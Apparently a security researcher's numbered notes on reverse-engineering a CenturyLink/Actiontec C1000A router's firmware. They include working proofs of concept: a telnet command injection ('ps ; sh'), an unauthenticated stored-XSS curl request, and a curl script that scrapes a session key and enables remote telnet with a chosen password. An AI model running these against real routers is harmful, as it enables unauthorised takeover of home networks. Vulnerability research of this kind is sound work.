1. I logged into the router's admin interface and went to the firmware update page. It gave me a
[link](http://qwest.centurylink.com/internethelp/modems/c1000a/firmware/) to download the firmware.
I downloaded the image to my computer

2. Running the image with `binwalk`, it said it contained a lot of big-endian JFFS2 filesystems. 
I'm sure there aren't more than a couple so I think it detecting the whole FS as many.

3. Running the image with `binwalk -A`, it detected MIPS instructions, which is common on routers.
Combined witht the big-endian FS, this tells me the CPU is big-endian MIPS.

4. Trying to extract with `binwalk -e`, I got a whole bunch of 20MB jffs2 images, totaling 13GB!
The original image was 20 MB so obviously this was too much. I manually extracted the image from
the offset 0x4000 with dd. `file` recognizes it as just data and `7z` can't extract it.
I installed the [jefferson](https://github.com/sviehb/jefferson) utility to extract the fs.

5. Jefferson extracted the fs and I archived the fs into a tar.gz archive for a backup. Inside
the fs there was a `vmlinux.lz` in the root directory. The lzma header was at an offset of 12 and
after removing the offset with dd, 7z was able to extract it, but the extracted image wasn't a 
valid ELF file. However, I was able to `grep` the hexdump for the ELF header. Extracting from the
ELF header with `dd`, `file` said it was an `ELF` image with an invalid byte order.

6. Looking in the `/bin` folder showed the binaries were 32-bit ELF MSB MIPS binaries, linked to uClibc.
Looking in `/lib/modules` showed that the Linux kernel version was 2.6.30, which was released in 2009.
This kernel was is old compared to the release year of the firmware, 2018.

7. Running `strings` on the kernel image and grepping for `gcc` showed that the kernel was built with
GCC 4.4.2 (released in 2009), on March 19, 2018 in the CST time zone.

8. The `/webs` directory contains all the HTML files for the web interface. Testing out the ping utility
on the web interface at `utilities_pingtest.html`, I see that validation that the IP address to ping is a
proper-formed IP is implemented client-side in JS. Ping utilities often have command injection vulnerabilities
since pinging is usually done through the command-line utility and ping does not have a libc interface.
The ping request, if valid, is sent to the address `utilities_pingtest.cgi`. Looking through the JS it also
seems to have a session key attached to it. I intercepted the request with Burp Suite and edited the request
from a real IP to a command (`touch /tmp/ok`)

9. I enabled and logged in to the telnet interface on the router. The telnet interface had an `sh` option, but
it asked for a user and passwd. Inputting the router's creds/telnet login creds (set as admin/admin) did not work.
However, some other utilities such as `ps` and `pwd` were available. Running `ps` of course listed the running
processes, but if I added the flag `--help` it showed the help for the busybox ps utility. I then tried appending
other commands. I entered `ps ; sh` and it gave me a shell.

10. After I was inside the shell I found the /etc/passwd file which came with hardcoded passwds. Cracking them
took seconds, but none of the logins worked on the `sh` command, so I stuck with the command injection to get a shell.

11. Looking in the /dev folder there is a ttyS0 device so there is likely a UART interface somewhere on the router.

12. Running cat on /proc/meminfo I get that MemTotal equals 59,004 kB. VmallocTotal equals 1,032,148 kB. There
is no swap space.

13. The rootfs has about 30MB of space total and about 7 MB free.

14. Looking in the /tmp directory, there is a `bootupmessages` file which contains dmesg-like output. It shows the
kernel was booted with parameters `root=mtd:rootfs ro rootfstype=jffs2 console=ttyS0,115200`. It tells us more
about the hardware such as that it has 64MB total memory,there are 2 CPUS, the CPU revision is
`0002a080 (Broadcom4350)`, the NAND flash is 64MB total, there are 2 USB devices, which support mass storage (which
I have used before), there are 2 serial devices (BCM63XX). There is only 1 external USB port, but there was a
comment about a Broadcom BCM3168D0 USB network device.

15. Looking at `mount`, the rootfs is mounted as rw.

16. It seems like the telnet being enabled doesn't persist after restarting.

17. Grepping for 'ping' and 'cgi' in binaries, I found the binary 'httpd' which I opened up for decompilation in
Ghidra. The function `cgiIPV6PingTest()` uses the format string "-c 4 -s %d %s %s" with sprintf into a fixed length
buffer with length 256. This could be a buffer overflow since sprintf doesn't check bounds. sprintf is called with
parameters (acstack272,__src,local_10,puvar2,0x4d9e84). The last argument seems extraneous because the format string
only has 3 paramaters, but the contents of this address are unknown. It then calls
`AEI_tsl_system_pwd(&local_1a0,acStack272,"/var/ping6.log","/var/ping6.fin");`. These log files may be useful to look
at.

18. Running cat on `/var/ping6.log` shows the busybox help for ping. After running a normal 'ping' I get a normal output
of that 8.8.8.8 is unreachable. I was able to also `ping6 ::1` and it produced a normal log. It seems just to load data
from the last ping log, when I tried to ping 8.8.4.4 from the web interface it showed data for ::1. Sending an unreachable 
address over ipv6 works, for example I wrote to ping ::2 from Burp Suite. I then tried another bad address, but it gave
a busybox help response. Adding spaces to the end of the address works. I got a hopeful result with the response
`traceroute6: invalid number '\`touch'`. However, this indicates that this may be being passed via exec() and not system(),
as there is no shell expansion. Looking in the dissasembled code for AEI_tsl_system_pwd, it passes the first argument of
the function to execv(), not system(). However, the buffer overflow is still there.


19. `proc/sys/kernel/randomize_va_space` is set to 2, meaning there is full ASLR enabled.

20. Executables are labeled as 'ELF 32-bit MSB executable' instead of 'shared library' or 'pie executable', indicating
that the executables on this system are not position-indepedent, making buffer overflows easier.

21. I tried to overflow the ipv6_hostname parameter in ipv6_pingtest.cgi with Burp Suite but it didn't crash.

22. I tried a path traversal in the web server, it gave an illegal filename error. Looking in Ghidra it returns that
error with by a strcmp with "../" or ".." or "/.." or "/../". The server, micro_httpd is open source so I should look
into that.

23. A buffer overflow in the micro_httpd GET request itself doesn't work either.

24. I was searching for the code for the telnet binary since it is vulnerable to command injection. I recursively
grepped for "Have a nice day" since that is the exit message of the telnet server. I didn't find that message in
`/bin/telnetd` but it was in `/lib/private/libcms_cli.so`.

25. Web GUI admin login sends username and password over unencrypted HTTP, username is in plaintext and password is
base64 encoded.

26. SessionID is generated in JS as a random number between 1 and 799,999,999 (<2^30)

27. I was able to login with Burp Suite repeater and set a custom session ID. It responded with a set-cookie for the
same session ID and with the HTTPOnly flag, and the `Path=/` flag. However, the cookie is accessible in sessionStorage.

28. It seems like only one valid session ID can exist at a time, an old cookie doesn't work after logging on again.

29. In the conf file I downloaded from the router, it has the XSS that I trigged in the website filtering page:

`<UrlAddress>&lt;img&#32;src=x&#32;onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;/&gt;</UrlAddress>`

This is an XSS vuln that is in `/urlfilter.cmd` and shows up on `/advancedsetup_websiteblocking.html`. In this,
as per my proof of concept. This is available to an unauthenticated user and thus could be used for privilege
escalation such as cookie stealing, enabling telnet, downloading configuration information, etc.

30. I looked to see if config could be uploaded or downloaded without authentication (without sessionID or sessionKey).
It seems like some of the `.cmd` files are sent authentication through sessionKeys. It uses a JS function
`loc = encryptquery(loc, key)`, where loc is the location to go to and key is the sessionKey. It used like this:

```
loc +='&sessionKey=';
loc +=sessionKey;
loc=encrypt_query(loc,key);
lochead+=loc;
postSubmit(lochead);
```
However, this is also present in `advancedsetup_websiteblocking.html` in the latest firmware image, too. This may be because
this firmware image is newer than the one I have on the router.

31. There is firmware downgrade protection, with a notice if the version of the firmware that is trying to be installed
is older than the current one in `utilities_upgradefirmware_real.html`. I couldn't find the firmware version
in the filesystem of the downloaded firmware image, but I did see that it is the same kernel version (2.6.30).

32. On Actiontec's website, it seems like 31.30L.95 is the latest release, which is what I have on the router. I downloaded
their GPL tar.gz file. Looking in the code it provides a whole build environment for building a firmware image (a prebuilt
one is included) but it doesn't seem to include the company-specific web config pages. It has the full kernel source
as well as some userspace programs like busybox and tcpdump.

33. Intercepting the request to get config from, it sends the sessionID cookie. I tried it without and it does need the session
cookie to work.

34. I tried to remove the XSS by editing the conf file and reupload it, but the website blocking page still doesn't
load at all

35. I factory reset the router to see what default config is like and to test XSS again.

36. After factory reset, the website blocking page works again. Telnet is not enabled by default. The firmware version
is still the same, it did not downgrade.

37. I tested my cURL POC for XSS and it works without authentication!
```
curl "http://192.168.0.1/urlfilter.cmd?action=set_url&TodUrlAdd=<img+src=x+onerror=\"alert(String.fromCharCode(88,83,83))\"/>&Lan_IP=192.168.0.2&listtype=Exclude" -X POST
```

38. I tried setting a custom name for the service blocking. If I did this I get an invalid session key error:
```
curl "http://192.168.0.1/serBlock.cmd?command=add&ip=192.168.0.2&name=Custom+Name&needthankyou=advancedsetup_servicesblocking.html" -X 'POST' -v 
```
However, if I remove the `needthankyou` parameter, I get no error but it doesn't show up on the website (I think
services come from a predefined list):
```
 curl "http://192.168.0.1/serBlock.cmd?command=add&ip=192.168.0.2&name=Custom+Name" -X 'POST' -v
```

39. It seems like a sessionKey isn't validated against authentication, for example I can just grab a sessionKey off of
the login page and use it to enable telnet without any cookies or login
```
echo 'Setting password to "0"'
key=$(curl http://192.168.0.1/login.html 2>0 | grep "var sessionKey" | grep -o "[0-9]*")
curl 'http://192.168.0.1/advancedsetup_remotetelnet.cgi?serCtlTelnet=3&remTelUser=admin&remTelTimeout=300'\
'&remTelPassChanged=1&nothankyou=0&remTelPass=MA%3D%3D&sessionKey='$key \
-X 'POST' -v -O /dev/null
```
This POC does NOT require authentication but however it DOES require an admin to be logged into the router or else
the request will redirect to the login page. E.g., if the web client user clicks Logout, or if the router is rebooted,
it no longer works. However, if I just close the browser without officially logging out, it does still work. This also
applies to the XSS PoC.